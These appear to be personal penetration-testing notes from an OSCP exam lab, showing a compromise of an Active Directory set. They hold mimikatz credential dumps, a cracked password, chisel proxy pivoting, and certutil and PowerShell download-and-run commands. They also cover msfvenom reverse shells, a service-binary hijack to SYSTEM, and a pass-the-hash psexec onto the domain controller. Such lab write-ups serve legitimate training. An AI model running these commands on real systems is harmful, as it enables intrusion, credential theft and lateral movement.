	 * Password : 39 3c 9b d7 81 94 68 be 78 7f 38 49 a8 7f 9a 34 34 af c7 13 4b c1 56 2a 6a 9e 09 5a 03 fa c3 75 d9 5c 74 91 79 6f 25 1a 49 b0 74 b4 97 05 67 d5 91 ca c1 6d 1c 50 f9 02 97 13 f8 49 5e 99 1e e8 9b 86 ec e5 76 a6 60 4b 63 c1 4a 7e e4 6a ac 4a db 1b c7 c1 58 99 5f a2 10 82 c2 8b 21 07 58 87 c8 c9 47 89 88 7c 0b 1a 24 06 7f b3 e9 ff f1 51 4a de 44 e3 e9 d7 37 84 f8 43 28 6b 30 7b f3 35 99 10 ab df 8a 89 b6 db bc ac ad 44 3b ea 74 b8 3d 13 bd ac 0c 74 0f b4 52 8d cc 66 a6 96 8d 79 b7 ee 40 1d 97 c0 60 24 56 14 67 e4 27 2b 13 4a b9 8e 35 1d 07 a0 b9 e6 a9 2e 2f 4f ec c6 dc c3 f6 26 d8 2f d8 da ee e5 42 17 1e b3 35 c3 c0 45 0d c6 87 b2 ba e3 90 fa 55 69 31 c8 b8 e0 ef 1d 08 13 e0 c3 b9 11 ec 5a 20 38 8d f8 e6 6d cf a9 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 9/14/2022 9:17:28 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b4acfa1e5db9a85466f9d28fd0a8c8f6
	 * SHA1     : 08f25b7d718bb70738a00270542cb9c28df9d2e2
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : OSCP.EXAM
	 * Password : 39 3c 9b d7 81 94 68 be 78 7f 38 49 a8 7f 9a 34 34 af c7 13 4b c1 56 2a 6a 9e 09 5a 03 fa c3 75 d9 5c 74 91 79 6f 25 1a 49 b0 74 b4 97 05 67 d5 91 ca c1 6d 1c 50 f9 02 97 13 f8 49 5e 99 1e e8 9b 86 ec e5 76 a6 60 4b 63 c1 4a 7e e4 6a ac 4a db 1b c7 c1 58 99 5f a2 10 82 c2 8b 21 07 58 87 c8 c9 47 89 88 7c 0b 1a 24 06 7f b3 e9 ff f1 51 4a de 44 e3 e9 d7 37 84 f8 43 28 6b 30 7b f3 35 99 10 ab df 8a 89 b6 db bc ac ad 44 3b ea 74 b8 3d 13 bd ac 0c 74 0f b4 52 8d cc 66 a6 96 8d 79 b7 ee 40 1d 97 c0 60 24 56 14 67 e4 27 2b 13 4a b9 8e 35 1d 07 a0 b9 e6 a9 2e 2f 4f ec c6 dc c3 f6 26 d8 2f d8 da ee e5 42 17 1e b3 35 c3 c0 45 0d c6 87 b2 ba e3 90 fa 55 69 31 c8 b8 e0 ef 1d 08 13 e0 c3 b9 11 ec 5a 20 38 8d f8 e6 6d cf a9 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 40354 (00000000:00009da2)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/14/2022 9:17:28 PM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b4acfa1e5db9a85466f9d28fd0a8c8f6
	 * SHA1     : 08f25b7d718bb70738a00270542cb9c28df9d2e2
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 39 3c 9b d7 81 94 68 be 78 7f 38 49 a8 7f 9a 34 34 af c7 13 4b c1 56 2a 6a 9e 09 5a 03 fa c3 75 d9 5c 74 91 79 6f 25 1a 49 b0 74 b4 97 05 67 d5 91 ca c1 6d 1c 50 f9 02 97 13 f8 49 5e 99 1e e8 9b 86 ec e5 76 a6 60 4b 63 c1 4a 7e e4 6a ac 4a db 1b c7 c1 58 99 5f a2 10 82 c2 8b 21 07 58 87 c8 c9 47 89 88 7c 0b 1a 24 06 7f b3 e9 ff f1 51 4a de 44 e3 e9 d7 37 84 f8 43 28 6b 30 7b f3 35 99 10 ab df 8a 89 b6 db bc ac ad 44 3b ea 74 b8 3d 13 bd ac 0c 74 0f b4 52 8d cc 66 a6 96 8d 79 b7 ee 40 1d 97 c0 60 24 56 14 67 e4 27 2b 13 4a b9 8e 35 1d 07 a0 b9 e6 a9 2e 2f 4f ec c6 dc c3 f6 26 d8 2f d8 da ee e5 42 17 1e b3 35 c3 c0 45 0d c6 87 b2 ba e3 90 fa 55 69 31 c8 b8 e0 ef 1d 08 13 e0 c3 b9 11 ec 5a 20 38 8d f8 e6 6d cf a9 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 38123 (00000000:000094eb)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 9/14/2022 9:17:27 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b4acfa1e5db9a85466f9d28fd0a8c8f6
	 * SHA1     : 08f25b7d718bb70738a00270542cb9c28df9d2e2
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 9/14/2022 9:17:27 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : OSCP.EXAM
	 * Password : 39 3c 9b d7 81 94 68 be 78 7f 38 49 a8 7f 9a 34 34 af c7 13 4b c1 56 2a 6a 9e 09 5a 03 fa c3 75 d9 5c 74 91 79 6f 25 1a 49 b0 74 b4 97 05 67 d5 91 ca c1 6d 1c 50 f9 02 97 13 f8 49 5e 99 1e e8 9b 86 ec e5 76 a6 60 4b 63 c1 4a 7e e4 6a ac 4a db 1b c7 c1 58 99 5f a2 10 82 c2 8b 21 07 58 87 c8 c9 47 89 88 7c 0b 1a 24 06 7f b3 e9 ff f1 51 4a de 44 e3 e9 d7 37 84 f8 43 28 6b 30 7b f3 35 99 10 ab df 8a 89 b6 db bc ac ad 44 3b ea 74 b8 3d 13 bd ac 0c 74 0f b4 52 8d cc 66 a6 96 8d 79 b7 ee 40 1d 97 c0 60 24 56 14 67 e4 27 2b 13 4a b9 8e 35 1d 07 a0 b9 e6 a9 2e 2f 4f ec c6 dc c3 f6 26 d8 2f d8 da ee e5 42 17 1e b3 35 c3 c0 45 0d c6 87 b2 ba e3 90 fa 55 69 31 c8 b8 e0 ef 1d 08 13 e0 c3 b9 11 ec 5a 20 38 8d f8 e6 6d cf a9 
	ssp :	
	credman :	
	cloudap :	

```

- going to crack hashes
```
hashes to be cracked:

Bob.Martin: 2a12e2af96237b2e7277f1b321ceb7b7
Alice.Walters: 3e24dcead23468ce597d6883c576f657 : 1q2w3e4r5t
```

![[hashes to be cracked.png]]


![[broken hashes.png]]

Checking to see if DC is reachable from MS01
![[pinged to ensure can touch machines.png]]


- have broken hash, going to setup chisel socks5 proxy

```shell
# setting up on my linux machine as server
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# ./chisel_1.8.1_linux_amd64 server -p 8000 --reverse

#transferring windows chisel over

certutil.exe -urlcache -split -f "http://192.168.49.118:1337/chisel_1.8.1_windows_amd64.exe"
# on windows box 2 make chisel client and remote forward to socks proxy to forward through socks proxy to allow connection to domain controller

12:22 PM 2/7/2023
	chisel_1.8.1_windows_amd64 client 192.168.49.118:8000 R:1080:socks
```

- modified proxy chains config
![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/proxchains.conf.png]]

- setup server and client for proxychains on my box

![[proxychains client and server.png]]

using chisel to hit the client @ 192.168.49.110 on port 8000 using the Reverse socks proxy on port 1080
- can only touch the .100 box from here
```shell
C:\Windows\Temp>ping -n 5 172.16.118.100
ping -n 5 172.16.118.100

Pinging 172.16.118.100 with 32 bytes of data:
Reply from 172.16.118.100: bytes=32 time<1ms TTL=128
Reply from 172.16.118.100: bytes=32 time<1ms TTL=128
Reply from 172.16.118.100: bytes=32 time<1ms TTL=128
Reply from 172.16.118.100: bytes=32 time=1ms TTL=128
Reply from 172.16.118.100: bytes=32 time<1ms TTL=128

Ping statistics for 172.16.118.100:
    Packets: Sent = 5, Received = 5, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 1ms, Average = 0ms

C:\Windows\Temp>ping -n 172.16.118.102
ping -n 172.16.118.102
IP address must be specified.

C:\Windows\Temp>ping -n 5 172.16.118.102
ping -n 5 172.16.118.102

Pinging 172.16.118.102 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 172.16.118.102:
    Packets: Sent = 5, Received = 0, Lost = 5 (100% loss),

C:\Windows\Temp>
```


![[ping check.png]]


```shell
# 2nd attempt at chisel
# server on linux machine
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# ./chisel_1.8.1_linux_amd64 server -p 8000 --reverse
2023/04/12 17:42:12 server: Reverse tunnelling enabled
2023/04/12 17:42:12 server: Fingerprint N2Crjighb1Ael1YKsq+Q/062CeRCl1TXNcbC8+ib7OI=
2023/04/12 17:42:12 server: Listening on http://0.0.0.0:8000

# on client 192.168.118.101
chisel_1.8.1_windows_amd64.exe client 192.168.49.118:8000 R:1080:socks

```

- I believe proxychains is setup
- going to try psexecing and xfreerdp'ing
#failed psexec
```shell
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# proxychains psexec.py Alice.Walters:'1q2w3e4r5t'@172.16.118.100
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.118.100:445  ...  OK
[*] Requesting shares on 172.16.118.100.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.

```

- going to try to connect with rdp

```shell
rdesktop -u <USERNAME> <IP>
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>

proxychains rdesktop -d OSCP -u Alice.Walters -p 1q2w3e4r5t 172.16.118.100     proxychains rdesktop -d corp.local -u Alice.Walters -p 1q2w3e4r5t 172.16.118.100
	-nope
proxychains rdesktop -d OSCP.exam -u Alice.Walters -p 1q2w3e4r5t 172.16.118.100
	-nope
proxychains rdesktop -u Alice.Walters -p 1q2w3e4r5t 172.16.118.100

xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
proxychains xfreerdp /u:OSCP\Alice.Walters /p:1q2w3e4r5t /v:172.16.118.100
xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>



 xfreerdp /u:Alice.Walters /p:1q2w3e4r5t /v:172.16.118.100

```


- proxychains isnt working, going to try plink
	- (proxy chains was working, rdp was just closed on the .100)
```shell
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# proxychains rdesktop 172.16.118.100 -u Alice.Walters -p 1q2w3e4r5t    
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Autoselecting keyboard map 'en-us' from locale
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.118.100:3389 <--socket error or timeout!
Core(error): tcp_connect(), unable to connect to 172.16.118.100

```


```

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# proxychains xfreerdp /u:Alice.Walters /p:1q2w3e4r5t /proxy:socks5://127.0.0.1:1080 /v:172.16.118.100
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:1080 <--socket error or timeout!
[18:32:34:359] [1851226:1851228] [ERROR][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex ERRCONNECT_CONNECT_FAILED [0x00020006]
[18:32:34:359] [1851226:1851228] [ERROR][com.freerdp.core] - failed to connect to 127.0.0.1
```

- proxychains is connected
```
- ┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# netstat -ano | grep 8000
tcp6       0      0 :::8000                 :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 192.168.49.118:8000     192.168.118.101:61312   ESTABLISHED keepalive (6.26/0/0)

```


- going to try proxy chains 1 more time using different ports.

```shell
# linux side server
./chisel_1.8.1_linux_amd64 server -p 6000 --reverse

# windows client side
chisel_1.8.1_windows_amd64.exe client 192.168.49.118:6000 R:1070:socks


certutil.exe -urlcache -split -f "http://192.168.49.118:1337/chisel_1.8.1_windows_amd64.exe"
```

- going to try plink if proxy chains doesn't work
```shell
# transferring over plink.exe
certutil.exe -urlcache -split -f "http://192.168.49.118:1337/plink.exe"

certutil.exe -urlcache -split -f "http://192.168.49.118:1337/nc.exe"

.\plink.exe -ssh -l kali -pw kali -R 192.168.49.118:3389:172.16.118.100:3389 192.168.49.118
```


Identified that Alice.Walters is part of the rdp group

- try plink.exe new version
![[alice walters rdp users.png]]


- Port 3389 is open on 172.16.118.102
```shell

C:\Windows\Temp>nc.exe -nv 172.16.118.100 3389
nc.exe -nv 172.16.118.100 3389
(UNKNOWN) [172.16.118.100] 3389 (?): TIMEDOUT      

C:\Windows\Temp>nc.exe -nv 172.16.118.102 3389
nc.exe -nv 172.16.118.102 3389
(UNKNOWN) [172.16.118.102] 3389 (?) open

```

![[3389 open on .102.png]]



- going to setup proxychains again

```shell
# 2nd attempt at chisel
# server on linux machine
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# ./chisel_1.8.1_linux_amd64 server -p 8000 --reverse
2023/04/12 17:42:12 server: Reverse tunnelling enabled
2023/04/12 17:42:12 server: Fingerprint N2Crjighb1Ael1YKsq+Q/062CeRCl1TXNcbC8+ib7OI=
2023/04/12 17:42:12 server: Listening on http://0.0.0.0:8000

# on client 192.168.118.101
chisel_1.8.1_windows_amd64.exe client 192.168.49.118:8000 R:1080:socks
```

```shell
# setting up on my linux machine as server
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# ./chisel_1.8.1_linux_amd64 server -p 8000 --reverse

#transferring windows chisel over

certutil.exe -urlcache -split -f "http://192.168.49.118:1337/chisel_1.8.1_windows_amd64.exe"
# on windows box 2 make chisel client and remote forward to socks proxy to forward through socks proxy to allow connection to domain controller

12:22 PM 2/7/2023
	chisel_1.8.1_windows_amd64 client 192.168.49.118:8000 R:1080:socks
	```

- Proxy chains working, and rdp is open, going to try to get on as alice
```shell

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/ADset]
└─# proxychains nc -nv 172.16.118.102 3389                               
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.118.102:3389  ...  OK
(UNKNOWN) [172.16.118.102] 3389 (ms-wbt-server) open : Operation now in progress
^C
```


![[working proxy chains .102.png]]

proxychains rdesktop -u Alice.Walters -p 1q2w3e4r5t 172.16.118.100

proxychains4 xfreerdp /u:Alice.Walters /p:1q2w3e4r5t /v:172.16.118.102

On As alice
![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/On as alice.png]]


- need to get a reverse shell from T2 alice box back to kali vm to take screenshot of flags

```shell
# generating new rev shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.118 LPORT=4545 -f exe -o revshell.exe 

```

# didnt need to do this start
- picture of reverse shell
![[revshell alice.png]]

- didnt work, going to need to rework my chisel command on MS01
```shell
certutil.exe -urlcache -split -f "http://192.168.49.118:1337/revshell.exe"
```

MS01 T1 chisel client

chisel_1.8.1_windows_amd64.exe client 192.168.49.118:8000 R:1080:socks
```
chisel_1.8.1_windows_amd64.exe client 192.168.49.118:8000 R:1080:socks 4430:192.168.49.118:443 4431:192.168.49.118:4431 4432:192.168.49.118:4432 4433:192.168.49.118:4433
```

 if this doesn't work, going to generate an msfvenom payload that connects back to MS01 make a reverse shell and hopefully forwarded back to my kali machine.

- going to go back to my original client chisel, get an addition reverse shell, 

Currently chisel setup:

kali <-> 192.168.118.101 (MS01) -> RDP into 172.16.118.102

Need Chisel setup:

kali <-> MS01 <-> MS02

- Opening a 2nd reverse shell before setting up client
```shell
# 2nd msfvenom shell made
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.118 LPORT=1313 -f exe -o revshell.exe 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.222 LPORT=4445 -f exe -o revshell.exe
```

![[2nd reverse shell.png]]
```shell
# pulling over 2nd reverse shell
certutil.exe -urlcache -split -f "http://192.168.49.118:1337/ms01-2nd.exe"

#caught 2nd system reverse shell
```


![[successful 2nd reverse shell.png]]

- now we have 2 shells i am setting one up as the proxy chains server 
```shell

chisel_1.8.1_windows_amd64.exe client 192.168.49.118:8000 R:1080:socks

```

- back on with xfreerdp

![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/back on with xfreerdp with 2 reverse shells on ms01.png]]


- going to try to pull over chisel
certutil.exe -urlcache -split -f "http://172.16.118.101:80/C:/Windows/Temp/chisel_1.8.1_windows_amd64.exe"

certutil.exe -urlcache -split -f "http://172.16.118.101:80\C:\Windows\Temp\chisel_1.8.1_windows_amd64.exe"

```shell
chisel_1.8.1_windows_amd64.exe client 192.168.49.118:8000 R:1080:socks 4430:192.168.49.118:443 4431:192.168.49.118:4431 4432:192.168.49.118:4432 4433:192.168.49.118:4433
````

- so chisel opened port 4430 and port 4431 
```shell
# client chisel that is being utilized
chisel_1.8.1_windows_amd64.exe client 192.168.49.118:8000 R:1080:socks 4430:192.168.49.118:443 4431:192.168.49.118:4431

 TCP    [::]:4430              [::]:0                 LISTENING       6388
TCP    [::]:4431              [::]:0                 LISTENING       6388
```

- Going to make new msfvenom reverse shell pointing to ms01 on port 443 so it forwards to the kali box

```shell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.118.101 LPORT=4430-f exe -o reversed.exe 

#grabbing reversed.exe on MS01

certutil.exe -urlcache -split -f "http://192.168.49.118:1337/reversed.exe"

certutil.exe -urlcache -split -f "http://172.16.118.101/C:/Windows/Temp/reversed.exe"
- didnt work, going to try powershell


powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://172.16.118.101/C:/Windows/Temp/reversed.exe', 'reversed.exe')

wget http://172.16.118.101/reversed.exe
```

- dragged and dropped reversed.exe to the desktop


![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/dragged and dropped reversed.exe.png]]
# Didnt need to do this stop
2nd Local.txt - check
```shell
# local.txt

C:\Users\Alice.Walters\Desktop>ipconfig
type local.txt
d15e951d62853ad7648c7c5bb784c911

C:\Users\Alice.Walters\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.118.102
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.118.254

C:\Users\Alice.Walters\Desktop>

```


![[alice local.txt.png]]

- going to attempt to privilege escalate using power up again
```powershell

echo IEX(New-Object Net.WebClient).DownloadString('http://172.16.118.101:443/PowerUp.ps1') | powershell -noprofile -

echo IEX(New-Object Net.WebClient).DownloadString('http://172.16.118.101:4430/PowerUp.ps1') | powershell -noprofile -
```

- transferred over chisel.exe onto t2 to make proxychains work
![[chisel transfer to ms02.png]]

- setting up chisel again 

```shell
# original chisel client on ms01
chisel_1.8.1_windows_amd64 client 192.168.49.118:8000 R:1080:socks

# chisel server on ms01
#./chisel server -p 8002 --reverse
chisel_1.8.1_windows_amd64.exe server -p 8002 --reverse
```

![[server chisel on ms01.png]]


- on ms02 setup chisel client

```shell

#Run command on ms02
chisel_1.8.1_windows_amd64.exe client 172.16.118.101:8002 R:2080:socks
```


![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/full setup chisel.png]]



What did i do so far:

Kali Machine is listening on port 1080 from port 8000.

ms01 is forwarding 


Working - actual - correct chisel client
```shell
#setting up chisel again
chisel_1.8.1_windows_amd64.exe client 192.168.49.118:8000 R:1080:socks 4430:192.168.49.118:443  
  
And to call back and invoke power up.ps1  

#working powerup.ps1
PS C:\Users\Alice.Walters> IEX(New-Object Net.WebClient).downloadString('http://172.16.118.101:4430/PowerUp.ps1')
Get-Acl : Attempted to perform an unauthorized operation.
At line:898 char:17
+                 Get-Acl -Path $CandidatePath | Select-Object -ExpandP ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Acl], UnauthorizedAccessException
    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.GetAclCommand



ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
Name                            : mysql
Check                           : Modifiable Service Files

ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
Name                            : mysql
Check                           : Modifiable Service Files

ModifiablePath    : C:\Users\Alice.Walters\AppData\Local\Microsoft\WindowsApps
IdentityReference : OSCP\Alice.Walters
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\Alice.Walters\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\Alice.Walters\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Alice.Walters\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

DefaultDomainName    : oscp.exam
DefaultUserName      : John.Howell
DefaultPassword      :
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
Check                : Registry Autologons
```

PowerUp.Ps1 Modifiable Service Files
![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/successful powerup.ps1 on ms02.png]]

```
# email notes
.\chisel.exe —max-retry-count 5 kali IP:8000 R:1080:socks 4430:kali ip:443  
  
And to call back and invoke power up.ps1  
  
IEX (New-Object System.Net.WebClient).Downloadstring(‘[http://target1ip:4430/PowerUp.Ps1](http://target1ip:4430/PowerUp.Ps1)’)  
  
Setup http server with 443  
```

-  modifiable service path
- everyone can write to mysqld.exe, can modify this file by grabbing a reverse shell and restarting the service
- unable to restart the service manually so going to have to setup reverse shell and shutoff machine again

![[official working chisel from ms01 to ms02.png]]


```shell
#making new msfvenom to replace mysqld.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.118.101 LPORT=4342 -f exe -o mysqld.exe
```

![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/msqld.exe reverse shell.png]]

```
# moving the real msqld.exe to realmsqld.exe
```

![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/realmsqld.exe movement.png]]

- Going to transfer new reverse shell over to take the realmysqld.exe's place

```shell

IEX (New-Object System.Net.WebClient).Downloadstring(‘[http://172.16.118.101:4430/mysqld.exe](http://172.16.118.101:4430/mysqld.exe)’)  


IEX (New-Object Net.WebClient).downloadString('http://172.16.118.101:4430/mysqld.exe')


powershell "IEX(New-Object Net.WebClient).downloadString('http://172.16.118.101:4430/mysqld.exe')"
echo IEX(New-Object Net.WebClient).DownloadString('http://172.16.118.101:4430/mysqld.exe')
```

Copied from Kali Machine to Location in file explorer using drag and drop through xfreerdp
![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/copied and pasted reverse shell mysqld.png]]

```shell
# setup nc.exe listener on ms01
C:\Users\BOB~1.MAR\Desktop\WSO2AM~1.0\WSO2AM~1.0>nc.exe -lvnp 4342
nc.exe -lvnp 4342
listening on [any] 4342 ...

# going to shutdown /r to restart service due to not being able to restart service manually

# on as system
C:\Users\BOB~1.MAR\Desktop\WSO2AM~1.0\WSO2AM~1.0>nc.exe -lvnp 4342
nc.exe -lvnp 4342
listening on [any] 4342 ...
connect to [172.16.118.101] from (UNKNOWN) [172.16.118.102] 49687

whoami
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```


![[on as system on ms02.png]]

#ms02 2nd proof.txt - screenshot - yes
```shell
# proof.txt
C:\Users\Administrator\Desktop>type proof.txt
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.118.102
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.118.254

C:\Users\Administrator\Desktop>
tpye proof.txt
'tpye' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop>
type proof.txt
861ba651112b3f938066fbbfc1967bbd

C:\Users\Administrator\Desktop>


```


![[proof.txt for ms02.png]]


- going to transfer over mimikatz and dump hashes again

```shell
certutil.exe -urlcache -split -f "http://172.16.118.101:4430/mimikatz.exe"
```

- successfully transfered over mimikatz on ms02

![[ms02 mimikatz transfer.png]]

- this shell sucks and have to click enter 3 times for commands to execute
- running mimikatz
```shell
C:\Windows\Temp>
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 

```

Mimikatz Privilege Debug
![[mimikatz privilege debug.png]]

- dumping credentials
```
mimikatz # sekurlsa::logonpasswords

mimikatz # 

mimikatz # 

Authentication Id : 0 ; 190752 (00000000:0002e920)
Session           : Interactive from 1
User Name         : John.Howell
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 4/12/2023 10:29:19 PM
SID               : S-1-5-21-3248544096-1843048206-1379434323-1116
	msv :	
	 [00000003] Primary
	 * Username : John.Howell
	 * Domain   : OSCP
	 * NTLM     : 859ae666977bdfcb72314492ac845a75
	 * SHA1     : b96652501577164f27b2beaebd78954b270e9b91
	 * DPAPI    : 683ab27925577dde06471f9e64481e93

```



![[dumped john.howell credentials.png]]

psexec'ing onto Domain Controller
```shell
#worked!
proxychains4 impacket-psexec oscp.exam/John.Howell@172.16.118.100 -hashes :859ae666977bdfcb72314492ac845a75
```

![[Penetration Testing v2/oscp pass 20230412/AD Set/MS01 192.168.118.101/screenshots/on dc as system.png]]


![[DC system info.png]]

 3rd proof.txt - domain - screenshot yes
```shell
# domain proof.txt
C:\Users\Administrator\Desktop> type proof.txt
e0f9e49a7d13a4bbb5d5583266a6acf1

C:\Users\Administrator\Desktop> ip a
'ip' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.118.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.118.254

C:\Users\Administrator\Desktop> 


```

![[domain proof.txt.png]]



All flags submitted in offensive security exam control
santec solutions
platform 1 airforce contract
largely remote but come together once a week

